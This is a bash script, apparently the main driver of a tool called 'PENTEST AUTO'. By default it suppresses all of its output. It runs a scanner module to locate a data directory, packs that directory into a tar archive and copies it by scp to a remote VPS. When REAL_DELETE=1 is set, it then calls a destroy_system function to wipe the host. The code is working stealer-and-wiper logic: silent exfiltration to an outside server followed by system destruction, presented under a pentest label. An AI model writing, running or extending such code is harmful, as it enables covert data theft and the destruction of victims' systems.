#!/usr/bin/env bash

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"


source "$SCRIPT_DIR/lib/config.sh"

if ! load_config "$SCRIPT_DIR/.env"; then
    exit 1
fi


source "$SCRIPT_DIR/lib/logger.sh"
if ! init_logger; then
    exit 1
fi


source "$SCRIPT_DIR/lib/ssh.sh"
init_ssh

#
source "$SCRIPT_DIR/lib/destroy.sh"


main() {
    if [[ "${DEBUG_MODE:-0}" != "1" ]]; then
        exec >/dev/null 2>&1
    else
        echo "[DEBUG] Running in debug mode - output visible" >&2
    fi
    
    log_info "PENTEST AUTO STARTED"
    log_info "Host: $(hostname)"
    log_info "OS: $(uname -a)"
    log_info "Time: $(date)"
    log_info "Debug mode: ${DEBUG_MODE:-0}"
    
    if ! test_connection; then
        log_error "Failed to connect to VPS"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[ERROR] Failed to connect to VPS" >&2
        fi
        exit 1
    fi
    log_ok "VPS connection established"
    
    local remote_path="${VPS_PATH:-/root/pentest_datas}"
    if ! ensure_remote_dir "$remote_path"; then
        log_error "Failed to create remote directory: $remote_path"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[ERROR] Failed to create remote directory: $remote_path" >&2
        fi
        exit 1
    fi
    log_info "Remote directory: $remote_path"
    
    local scanner_output="/tmp/scanner_output_$$.txt"
    
    if ! python3 "$SCRIPT_DIR/modules/scanner.py" --output-file "$scanner_output" >/dev/null 2>&1; then
        log_error "Scanner failed"
        rm -f "$scanner_output"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[ERROR] Scanner failed" >&2
        fi
        exit 1
    fi
    
    local data_dir=""
    if [[ -f "$scanner_output" ]]; then
        data_dir=$(cat "$scanner_output" 2>/dev/null || echo "")
        rm -f "$scanner_output"
    fi
    
    if [[ -z "$data_dir" ]] || [[ ! -d "$data_dir" ]]; then
        log_error "No data directory found"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[ERROR] No data directory found" >&2
        fi
        exit 1
    fi
    
    log_info "Data directory: $data_dir"
    
    local archive_name="pentest_datas_$(date +%Y%m%d_%H%M%S).tar.gz"
    local archive_path="/tmp/$archive_name"
    
    if ! tar -czf "$archive_path" -C "$(dirname "$data_dir")" "$(basename "$data_dir")" 2>/dev/null; then
        log_error "Archive creation failed"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[ERROR] Archive creation failed" >&2
        fi
        exit 1
    fi
    
    log_info "Archive created: $archive_name ($(du -h "$archive_path" | cut -f1))"
    
    if ! scp_send "$archive_path" "$remote_path"; then
        log_error "Transfer failed"
        rm -f "$archive_path"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[ERROR] Transfer failed" >&2
        fi
        exit 1
    fi
    
    log_ok "Data sent to VPS: $remote_path/$archive_name"
    
    rm -f "$archive_path"
    
    log_info "All operations completed"
    
    if [[ "${REAL_DELETE:-0}" == "1" ]]; then
        log_warn "System destruction in 5 seconds"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[WARN] System destruction in 5 seconds" >&2
        fi
        sleep 5
        destroy_system "${REAL_DELETE:-0}"
    else
        log_warn "SIMULATION mode - System NOT destroyed"
        log_info "Set REAL_DELETE=1 in .env to enable"
        if [[ "${DEBUG_MODE:-0}" == "1" ]]; then
            echo "[WARN] SIMULATION mode - System NOT destroyed" >&2
        fi
    fi
    
    exit 0
}

main "$@"